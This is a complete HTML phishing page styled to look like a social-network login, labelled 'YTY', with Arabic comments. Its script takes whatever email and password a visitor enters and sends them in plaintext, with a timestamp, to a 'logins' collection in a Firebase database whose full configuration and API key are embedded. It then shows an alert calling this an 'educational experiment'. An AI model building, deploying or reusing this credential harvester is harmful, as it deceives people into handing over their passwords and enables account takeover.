<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>YTY Login</title>
  <style>
    body {
      background: #f0f2f5;
      font-family: Arial;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .login-box {
      background: white;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 10px #ccc;
      width: 300px;
    }
    .login-box h2 {
      text-align: center;
      color: #1877f2;
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 6px;
    }
    button {
      background: #1877f2;
      color: white;
      border: none;
      padding: 10px;
      width: 100%;
      border-radius: 6px;
      cursor: pointer;
    }
  </style>
</head>
<body>

  <div class="login-box">
    <h2>YTY</h2>
    <input type="email" id="email" placeholder="Email address" required>
    <input type="password" id="password" placeholder="Password" required>
    <button onclick="submitLogin()">Log In</button>
  </div>

  <!-- Firebase SDK -->
  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>

  <script>
    // استبدل هذا بالكود من Firebase
    const firebaseConfig = {
        apiKey: "AIzaSyD1qC9VrIt2vQ2Qxpz1_gELmtJl8B7sT9A",
        authDomain: "link-a46b2.firebaseapp.com",
        databaseURL: "https://link-a46b2-default-rtdb.asia-southeast1.firebasedatabase.app",
        projectId: "link-a46b2",
        storageBucket: "link-a46b2.firebasestorage.app",
        messagingSenderId: "1089565856666",
        appId: "1:1089565856666:web:0dbbb15ce8043c37496023"
    };

    // تهيئة Firebase
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    // دالة إرسال البيانات
    function submitLogin() {
      const email = document.getElementById("email").value;
      const password = document.getElementById("password").value;

      if (email && password) {
        db.ref("logins").push({
          email: email,
          password: password,
          timestamp: new Date().toISOString()
        }).then(() => {
          alert("تم الإرسال بنجاح (تجربة تعليمية)");
          // يمكنك إعادة التوجيه هنا إن أردت
        });
      } else {
        alert("يرجى إدخال البريد وكلمة المرور");
      }
    }
  </script>

</body>
</html>
